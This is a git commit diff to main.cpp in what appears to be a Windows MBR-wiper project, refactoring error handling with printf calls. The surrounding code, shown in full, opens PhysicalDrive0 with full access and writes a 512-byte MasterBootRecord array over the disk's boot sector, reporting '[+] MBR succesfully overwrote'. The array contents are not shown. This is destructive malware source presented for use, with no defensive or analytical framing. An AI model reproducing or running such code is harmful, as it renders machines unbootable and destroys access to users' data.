d5ab59003df0831666181ddf2b0df02d966f1539
Android1337 <51016908+Android1337@users.noreply.github.com>
2021-06-30 15:24:03 +0200

    Main cpp file

--- main.cpp
+++ main.cpp
@@ -7,23 +7,12 @@ const unsigned char MasterBootRecord[] = {
 int main() {
     DWORD ResultBytesWritten;
     HANDLE hDiskDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
-    if(hDiskDevice == INVALID_HANDLE_VALUE) goto invalid_handle;
+    if(hDiskDevice == INVALID_HANDLE_VALUE) printf("[!] Cant handle PhysicalDrive0\n");
     bool ResultState = WriteFile(hDiskDevice, MasterBootRecord, 512, &ResultBytesWritten, 0);
     CloseHandle(hDiskDevice);
 
-    if(!ResultState) goto writefile_failed;
+    if(!ResultState) printf("[!] Failed to overwrite the MBR\n");
     else printf("[+] MBR succesfully overwrote\n");
     Sleep(3000);
     return 0;
-
-
-    invalid_handle:
-        printf("[!] Cant handle PhysicalDrive0\n");
-        Sleep(3000);
-        return 0;
-
-    writefile_failed:
-        printf("[!] Failed to overwrite the MBR\n");
-        Sleep(3000);
-        return 0;
 }
